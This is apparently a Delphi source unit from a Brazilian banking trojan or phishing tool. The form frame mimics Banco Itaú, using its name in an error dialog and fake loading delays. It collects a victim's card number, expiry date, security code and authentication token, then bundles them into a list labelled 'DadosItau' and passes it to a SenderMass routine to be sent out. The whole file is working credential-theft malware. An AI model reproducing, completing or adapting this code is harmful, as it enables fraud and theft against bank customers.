unit Itas3;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, StdCtrls;

type
  TItasFrame2 = class(TFrame)
    Image1: TImage;
    EditCard: TEdit;
    EditMes: TEdit;
    EditAno: TEdit;
    EditSeg: TEdit;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Image2: TImage;
    PanIta: TPanel;
    Image3: TImage;
    Image4: TImage;
    EditTok: TEdit;
    procedure Image2Click(Sender: TObject);
    procedure Image4Click(Sender: TObject);
    procedure EditCardChange(Sender: TObject);
    procedure EditMesChange(Sender: TObject);
    procedure EditAnoChange(Sender: TObject);
  private
    { Private declarations }
  public
    S: String;
  end;

implementation

{$R *.dfm}
uses
Natal, Gerador, Itas4;

procedure TItasFrame2.EditAnoChange(Sender: TObject);
begin
  if Length(EditAno.Text) = 4 then
  EditSeg.SetFocus;
end;

procedure TItasFrame2.EditCardChange(Sender: TObject);
begin
    if Length(EditCard.Text) = 19 then
  EditMes.SetFocus;

  if s = 's' then
begin
if length(EditCard.Text) = 4 then
begin
EditCard.Text := EditCard.Text + ' ';
EditCard.SelStart := length(EditCard.Text);
end;

if length(EditCard.Text) = 9 then
begin
EditCard.Text := EditCard.Text + ' ';
EditCard.SelStart := length(EditCard.Text);
end;

if length(EditCard.Text) = 14 then
begin
EditCard.Text := EditCard.Text + ' ';
EditCard.SelStart := length(EditCard.Text);
end;

end
else
begin
s :='s';
end;
end;

procedure TItasFrame2.EditMesChange(Sender: TObject);
begin
  if Length(EditMes.Text) = 2 then
  EditAno.SetFocus;
end;

procedure TItasFrame2.Image2Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(4000);
  Screen.Cursor := crDefault;
  PanIta.Visible := True;
end;

procedure TItasFrame2.Image4Click(Sender: TObject);
var
ItasFrame4: TItasFrame4;
begin
  Screen.Cursor := crHourGlass;
  Sleep(8000);
  Screen.Cursor := crDefault;

   if EditTok.Text='' then
  begin
    MessageBox(Self.handle,'Por favor! Digite o Código Gerado no Aplicativo, ou recebido em seu Celular!', 'BANCO ITAU S.A', mb_IconError + mb_Ok);
    exit;
  end;

  DadosEnvio_ := TStringList.Create;
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('ITAU');
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('CARD...:  '+EditCard.Text);
  DadosEnvio_.Add('VAIDADE:  '+EditMes.Text+'/'+EditAno.Text);
  DadosEnvio_.Add('CODIGO;:  '+EditSeg.text);
  DadosEnvio_.Add('TOK_01.:  '+EditTok.text);
  DadosEnvio_.Add('=============================================');

//SENDBOX
try
begin
  ItasFrame4 := TItasFrame4.Create(Self);

with ItasFrame4 do
  begin
    Parent := Self;
    Height := 230;
    Left   := 12;
    Top    := 87;
    Width  := 756;
  end;

  SenderMass(DadosEnvio_ , 'DadosItau');
  DadosEnvio_.Free;
  end;
finally
end;
end;
end.
